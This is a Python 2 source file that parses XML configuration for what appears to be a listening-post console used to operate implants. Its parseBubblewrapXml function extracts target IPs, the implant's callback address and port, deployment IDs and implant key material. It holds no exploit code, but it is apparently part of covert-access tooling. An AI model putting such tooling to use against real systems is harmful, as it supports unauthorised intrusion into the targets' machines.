import os
import xml.dom.minidom
import Lp_FrontEndFunctions
import Lp_UserInterface
import textwrap

def parseIface(mod,architecture,lpArch):
    curDir=os.getcwd() 
    modName=mod.split('/')[len(mod.split('/'))-1]
    modStripped=modName.split('_')[0]
    modStripped=modStripped.split('.')[0]
    
    modPath = findModuleXml(modStripped)
    if modPath == '':
        return -1

    dom=xml.dom.minidom.parse(os.path.join(modPath,(modStripped+'.xml')))
    
    ifaceNum=dom.getElementsByTagName('iface')[0].firstChild.data
    return int(ifaceNum)

def parseDefaultDir():
    curDir=os.getcwd() 
    dom=xml.dom.minidom.parse((curDir+'/Xml/Lp.xml'))
    defaultDir = dom.getElementsByTagName('defaultDir')

    if len(defaultDir)>0:
        return "%s%s"%(curDir,defaultDir[0].firstChild.data)
    else:
        return (curDir+'/Output/')

def __getParameter(command,atterName,save):
    parameters = command.getElementsByTagName('parameters')[0]
    parameterList = parameters.getElementsByTagName('parameter')
    for parameter in parameterList:
        if parameter.getAttribute('name') == atterName:
            if save == True:
                data = parameter.firstChild.data
                f = open(atterName,'w+')
                f.write(data)
                f.close()
                return os.path.join(os.getcwd(),'BubbleKeys',atterName)
            else:
                return parameter.firstChild.data

    return -1

def parseBubblewrapXml(pathToXml,funcDict):
    try:
        try:
            cwd = os.getcwd()
            os.mkdir(os.path.join(cwd,'BubbleKeys'))
        except OSError:
            #we dont care if the directory already exists.
            pass


        bubbleDom = xml.dom.minidom.parse(pathToXml)

        topLevel = bubbleDom.getElementsByTagName('dci')[0]

        header = topLevel.getElementsByTagName('header')[0]
        fQ = header.getElementsByTagName('fullyQualifiedId')[0]
        targetId = fQ.getElementsByTagName('targetId')[0].firstChild.data
        instanceId = fQ.getElementsByTagName('instanceId')[0].firstChild.data

        commands = topLevel.getElementsByTagName('commands')[0]

        commandList = commands.getElementsByTagName('command')
        for command in commandList:
            if command.getAttribute('name') == 'targetInformation':
                targetIp = __getParameter(command,'targetIp',False)

            if command.getAttribute('name') == 'implantLp':
                ip = __getParameter(command,'ip',False)
                port = __getParameter(command,'port',False)

            if command.getAttribute('name') == 'deploymentId':
                deployId = __getParameter(command,'id',False)

            if command.getAttribute('name') == 'implantCrypto':
                cv = __getParameter(command,'cv',True)
                
            if command.getAttribute('name') == 'infMod':
                infMod = __getParameter(command,'infMod',True)

            if command.getAttribute('name') == 'infMu':
                infMu = __getParameter(command,'infMu',True)

            if command.getAttribute('name') == 'infPriv':
                infPriv = __getParameter(command,'infPriv',True)

            if command.getAttribute('name') == 'infPub':
                infPub = __getParameter(command,'infPub',True)

            if command.getAttribute('name') == 'impMod':
                impMod = __getParameter(command,'impMod',True)

            if command.getAttribute('name') == 'impMu':
                impMu = __getParameter(command,'impMu',True)

            if command.getAttribute('name') == 'impPriv':
                impPriv = __getParameter(command,'impPriv',True)

            if command.getAttribute('name') == 'impPub':
                impPub = __getParameter(command,'impPub',True)

        funcDict['targetId'] = targetId
        funcDict['instanceId'] = int(instanceId)
        funcDict['deploymentId'] = int(deployId)
        funcDict['targetIp'] = targetIp
        funcDict['ip'] = ip
        funcDict['port'] = port
        funcDict['cv'] = cv
        funcDict['infMod'] = infMod
        funcDict['infMu'] = infMu
        funcDict['infPriv'] = infPriv
        funcDict['infPub'] = infPub
        funcDict['impMod'] = impMod
        funcDict['impMu'] = impMu
        funcDict['impPriv'] = impPriv
        funcDict['impPub'] = impPub

        return 0

    except IOError:
        print "The specified xml file could not be found: %s"%pathToXml
        return -1
    except AttributeError:
        print "Error parsing provided xml: %s"%pathToXml
        return -1

def findModuleXml(modName):
    curDir=os.getcwd() 
    baseDir = os.path.join(curDir,'../Mods')
    modTypes = os.listdir(baseDir)
    for modType in modTypes:
        projects = os.listdir(os.path.join(baseDir,modType))
        for project in projects:
            arches = os.listdir(os.path.join(baseDir,modType,project))
            for arch in arches:
                files = os.listdir(os.path.join(baseDir,modType,project,arch))
                for file in files:
                    if file.find(modName+'.xml')>=0:
                        return os.path.join(baseDir,modType,project,arch)

    #try one more time in cur/Xml
    files = os.listdir(os.path.join(curDir,'Xml'))
    for file in files:
        if file.find(modName+'.xml')>=0:
            return os.path.join(curDir,'Xml')

    return ''

#Parse the xml file for the module specified in usrIn and populate the Modules dictionary
#Arguments:
def parseMod(helpDict, Modules, mod, architecture, lpArch, fMaps, requireLpex,
             lpFuncs, okToParse):
    parsedFunctions = []
                   
    if okToParse>0:
        return

    curDir=os.getcwd() 
    modName=mod.split('/')[-1]
    modStripped=modName.split('_')[0]
    modStripped=modStripped.split('.')[0]
    path = mod.split('/')[:-1]
    #just a module name was given, we need to search ../Mods until we find
    #an xml file for this module
    if len(path) == 0:
        modPath = findModuleXml(modStripped)
        if modPath == '':
            return
    else:
        modPath = '/'+os.path.join(*path)
    
    modName = modStripped+'.xml'
    dom=xml.dom.minidom.parse(os.path.join(modPath,modName))

    if requireLpex == 1:
        dirSplit=mod.split('/')[:-1]
        if lpArch=='i386':
            lpEx='%s.lx32'%modStripped
        else:
            lpEx='%s.lx64'%modStripped

        fileLoc = '/'+os.path.join(*dirSplit)
        fileLoc = os.path.join(fileLoc,lpEx)
        
        if not os.path.exists(fileLoc):
            print "\nCould not find an Lp extension for %s."%lpEx.split('.')[0],
            print "Ensure that an Lp extension is located in\nRelease/Mods/App/<project name>/<arch>."
            return
            
        lpexArgs = Modules['Lp']['Lp.lpex']
        Lp_UserInterface.setLpexArgs(lpexArgs, fileLoc)
        #silently ignore errors since we dont care if the lpex was already loaded
        lpFuncs.cmdGeneric('lpex',lpexArgs,{})

    Modules[modStripped]={}
    helpDict[modStripped]={}
    modDict=Modules[modStripped]
    ifaceNum=dom.getElementsByTagName('iface')[0].firstChild.data

    helpDict[modStripped]['iface']=ifaceNum
    Modules[modStripped]['iface']=ifaceNum
    functions=dom.getElementsByTagName('function')
    for f in functions:

        #Read optional parameters
        cursesOpt=f.getElementsByTagName('curses')
        if len(cursesOpt)>0:
            cursesOpt=cursesOpt[0].firstChild.data
            
        noArgs=f.getElementsByTagName('noargs')
        if len(noArgs)>0:
            noArgs=noArgs[0].firstChild.data
            
        confirm=f.getElementsByTagName('confirm')
        if len(confirm)>0:
            confirm=confirm[0].firstChild.data

        dirList=f.getElementsByTagName('useDirList')
        if len(dirList)>0:
            dirList=dirList[0].firstChild.data

        switch=f.getElementsByTagName('useSwitch')
        if len(switch)>0:
            switch=switch[0].firstChild.data
            
        noDisplay=f.getElementsByTagName('nodisplay')
        if len(noDisplay)>0:
            noDisplay=noDisplay[0].firstChild.data

        printFunc=f.getElementsByTagName('printFunctionOnComplete')
        if len(printFunc)>0:
            printFunc=printFunc[0].firstChild.data

        argConfirm=f.getElementsByTagName('useArgConfirm')
        if len(argConfirm)>0:
            argConfirm=argConfirm[0].firstChild.data

        ignoreDone=f.getElementsByTagName('ignoreDone')
        if len(ignoreDone)>0:
            ignoreDone=ignoreDone[0].firstChild.data

        endOnString=f.getElementsByTagName('endOnString')
        if len(endOnString)>0:
            endOnString=endOnString[0].firstChild.data

        useDefaultDir=f.getElementsByTagName('useDefaultDir')
        if len(useDefaultDir)>0:
            useDefaultDir=useDefaultDir[0].firstChild.data

        useBubblewrapXml=f.getElementsByTagName('useBubblewrapXml')
        if len(useBubblewrapXml)>0:
            useBubblewrapXml=useBubblewrapXml[0].firstChild.data

        checkForCfg=f.getElementsByTagName('checkForCfg')
        if len(checkForCfg)>0:
            checkForCfg=checkForCfg[0].firstChild.data

        #Read required parameters
        try:
            fName="%s.%s"%(modStripped,f.getElementsByTagName('name')[0].firstChild.data)
        except IndexError:
            str1='Warning! Function configuration does not contain the function name.'
            str2='This function will not be available.'
            print textwrap.fill('%s %s'%(str1,str2))
            continue

        try:
            fNum=f.getElementsByTagName('fnum')[0].firstChild.data
        except IndexError:
            str1='Warning! Function configuration does not contain the function number.'
            str2='This function will not be available.'
            print textwrap.fill('%s %s'%(str1,str2))
            continue

        try:
            command=f.getElementsByTagName('command')[0].firstChild.data
        except IndexError:
            str1="Configuration for the function %s does not contain the necessary element 'command'!"%(fName)
            str2="This function will not be available."
            print textwrap.fill("%s  %s"%(str1,str2))
            continue

        helpDict[modStripped][fName]={}

        try:
            fMaps[fNum]=fName
            helpDict[modStripped][fName]['nodisplay']=noDisplay
            if noDisplay != 'true': 
                parsedFunctions.append(fName)
            helpDict[modStripped][fName]['fnum']=fNum
            helpDict[modStripped][fName]['usage']=f.getElementsByTagName('helpUse')[0].firstChild.data
            helpDict[modStripped][fName]['text']=f.getElementsByTagName('helpText')[0].firstChild.data
        except IndexError:
            print textwrap.fill("Warning! Function configuration for %s does not contain help information!"%fName)
            helpDict[modStripped][fName]['nodisplay']=noDisplay
            helpDict[modStripped][fName]['usage']=""
            helpDict[modStripped][fName]['text']=""

        modDict[fName]={}
        modDict[fName]['curses']=cursesOpt
        modDict[fName]['command']=command
        modDict[fName]['fnum']=fNum
        modDict[fName]['noargs']=noArgs
        modDict[fName]['confirm']=confirm
        modDict[fName]['useDirList']=dirList
        modDict[fName]['useSwitch']=switch
        modDict[fName]['nodisplay']=noDisplay
        modDict[fName]['cursesPrompts']=[]
        modDict[fName]['promptList']={}
        modDict[fName]['printFunc']=printFunc
        modDict[fName]['useArgConfirm']=argConfirm
        modDict[fName]['ignoreDone']=ignoreDone
        modDict[fName]['endOnString']=endOnString
        modDict[fName]['useDefaultDir']=useDefaultDir
        modDict[fName]['useBubblewrapXml']=useBubblewrapXml
        modDict[fName]['checkForCfg']=checkForCfg
        modDict[fName]['errors']={}

        bubblePrompt = f.getElementsByTagName('bubblePrompt')
        if len(bubblePrompt)>0:
            modDict[fName]['bubblePrompt'] = bubblePrompt[0].firstChild.data

        errors = f.getElementsByTagName('errors')
        if len(errors)>0:
            errorEnts = errors[0].getElementsByTagName('errorEnt')
            for entry in errorEnts:
                errorStr = entry.getElementsByTagName('errorStr')
                errorStr=errorStr[0].firstChild.data
                errorMsg = entry.getElementsByTagName('errorMsg')
                if type(errorMsg[0].firstChild) == type(None):
                    errorMsg=''
                else:
                    errorMsg=errorMsg[0].firstChild.data

                modDict[fName]['errors'][str(errorStr)] = str(errorMsg)

        prompts=f.getElementsByTagName('prompt')
        for p in prompts:
            attr=p.getAttribute('value')
            attrC=p.getAttribute('cprompt')
            modDict[fName][p.firstChild.data]=attr

            #If this prompt is specified as a curses prompt, append it to the list
            if attrC!="":
                modDict[fName]['cursesPrompts'].append((p.firstChild.data,attrC))

        switchArgs=f.getElementsByTagName('switch')
        if switchArgs.length>0:
            modDict[fName]['switchParams']={}
            switchDict=modDict[fName]['switchParams']
            for s in switchArgs:
                switchDict['prompt']=str(s.getElementsByTagName('sprompt')[0].firstChild.data)
                switchDict['switchOpts']={}
                options=s.getElementsByTagName('switchOpt')
                for opt in options:
                    optionString=opt.getElementsByTagName('input')[0].firstChild.data
                    switchDict['switchOpts'][optionString]=[]
                    vals=opt.getElementsByTagName('setValue')
                    for val in vals:
                        switchDict['switchOpts'][optionString].append((val.firstChild.data,
                                                                       val.getAttribute('value')
                                                                       ))

        argConfirmArgs=f.getElementsByTagName('argConfirms')
        if argConfirmArgs.length>0:
            modDict[fName]['argConfirmParams']={}
            confirmDict=modDict[fName]['argConfirmParams']
            for c in argConfirmArgs:
                args=c.getElementsByTagName('arg')
                for a in args:
                    promptName=a.getElementsByTagName('promptToConfirm')[0].firstChild.data
                    valToConfirm=a.getElementsByTagName('valToConfirm')[0].firstChild.data
                    confirmDict[promptName]=valToConfirm
                        
        dirListArgs=f.getElementsByTagName('dirList')
        if dirListArgs.length>0:
            modDict[fName]['dirListParams']={}
            dirParams=modDict[fName]['dirListParams']
            for d in dirListArgs:
                prePrint=d.getElementsByTagName('prePrint')
                if len(prePrint)>0:
                    dirParams['prePrint']=str(prePrint[0].firstChild.data)
                else:
                     dirParams['prePrint']=[]

                listPrompt=d.getElementsByTagName('listPrompt')
                if len(listPrompt)>0:
                    dirParams['listPrompt']=str(listPrompt[0].firstChild.data)
                else:
                    dirParams['listPrompt']=[]

                fileEx=d.getElementsByTagName('fileEx')
                if len(fileEx)>0:
                    dirParams['fileEx']=str(fileEx[0].firstChild.data)
                else:
                    dirParams['fileEx']=[]

                prependCWD=d.getElementsByTagName('prependCWD')
                if len(prependCWD)>0:
                    dirParams['prependCWD']=str(prependCWD[0].firstChild.data)
                else:
                    dirParams['prependCWD']=[]

                appendImplantArch=d.getElementsByTagName('appendImplantArch')
                if len(appendImplantArch)>0:
                    dirParams['appendImplantArch']=str(appendImplantArch[0].firstChild.data)
                else:
                    dirParams['appendImplantArch']=[]

                baseDir=d.getElementsByTagName('baseDir')
                if len(baseDir)>0:
                    dirParams['baseDir']=str(baseDir[0].firstChild.data)
                else:
                    dirParams['baseDir']=[]

                promptToSet=d.getElementsByTagName('promptToSet')
                if len(promptToSet)>0:
                    dirParams['promptToSet']=str(promptToSet[0].firstChild.data)
                else:
                    dirParams['promptToSet']=[]

                showIfaceNumbers=d.getElementsByTagName('showIfaceNumbers')
                if len(showIfaceNumbers)>0:
                    dirParams['showIfaceNumbers']=str(showIfaceNumbers[0].firstChild.data)
                else:
                    dirParams['showIfaceNumbers']=[]

                modNameSplitChar=d.getElementsByTagName('modNameSplitChar')
                if len(modNameSplitChar)>0:
                    dirParams['modNameSplitChar']=str(modNameSplitChar[0].firstChild.data)
                else:
                    dirParams['modNameSplitChar']=[]

                requireXml=d.getElementsByTagName('requireXml')
                if len(requireXml)>0:
                    dirParams['requireXml']=str(requireXml[0].firstChild.data)
                else:
                    dirParams['requireXml']=[]

                recurse=d.getElementsByTagName('recurse')
                if len(recurse)>0:
                    dirParams['recurse']=str(recurse[0].firstChild.data)
                else:
                    dirParams['recurse']=[]

    return parsedFunctions
    
